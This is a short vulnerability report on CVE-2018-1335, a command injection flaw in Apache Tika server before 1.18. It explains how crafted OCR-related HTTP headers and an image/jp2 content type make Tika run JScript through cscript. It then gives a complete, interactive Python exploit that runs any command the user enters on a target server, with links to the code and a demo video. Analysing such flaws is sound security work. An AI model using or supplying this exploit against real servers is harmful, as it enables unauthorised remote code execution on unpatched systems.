<div align="center"><h1>CVE-2018-1335 REPORT</h1></div>

## About the vulnerability

This vulnerability leads to command injection vulnerability in Apache Tika server uses Cscript.exe to execute Jscript or VBS code and run arbitary commands.

**On versions:** Apache Tika server <1.18

**Pre-requisites:** No pre-requisites. Run the Tika server in its default configuration.

## Explanation
The entry point for this vulnerability is HTTP request header. To exploit this vulnerability, we need to pass the arguments in through HTTP request to `processHeaderConfig` function. This function sets the properties of the `TesseractORConfig` object.

The `doOCR` function in `TesseractORConfig.java` passes the config properties from the `TesseractORConfig` object, directly into an array of strings and it is further used to construct command for `ProcessBuilder`.

When we pass our command in the header as `X-Tika-OCRTesseractPath: <some command>`, the command is inserted into the cmd string but is unable to execute becuase of the prepending of some uncontrolable strings. To bypass this, we have to wrap our command in double quotes. This would result in windows ignoring whatever is appended to it after the qoutes. This would result in execution of our injected command.

`OCR` is used for pulling text and content out of the images and that's why we used image as our content-type so that we can reach the `doOCR` function.
The only way through which we can make Tika accept our command without embedding them into an image and then uploading that image is by setting the `Content-type` to `image/jp2`. This particular thing forces Tika to not check magic bytes of the image and allows the image to process through OCR. This resulted in the successful upload of our "image" file containing VBScript. We are able to successfully exploit the vulnerability.

## Exploit
```
#!/usr/bin/python

import requests

host = input("=> Target website/IP address = ")
port = input("=> Port number = ")
command = input("=> Command = ")

url = "http://"+host+':'+port+'/meta'

header = {"X-Tika-OCRTesseractPath": "\"cscript\"", "X-Tika-OCRLanguage": "//E:Jscript", "Content-type": "image/jp2"}

script = '''WScript.CreateObject("WScript.Shell").Run("cmd.exe /k %s")'''%command

requests.put(url, headers=header, data = script)
```
[Exploit code link](https://github.com/yash-bansod/Techmeet21-SAPTANG/blob/chall4/chall4/exploit.py)

Exploit was tested on Apache Tika 1.17 with Java version 1.7.0_80

## Proof Of Concept (PoC)

[PoC video link](https://youtu.be/gDetAKkIXgs)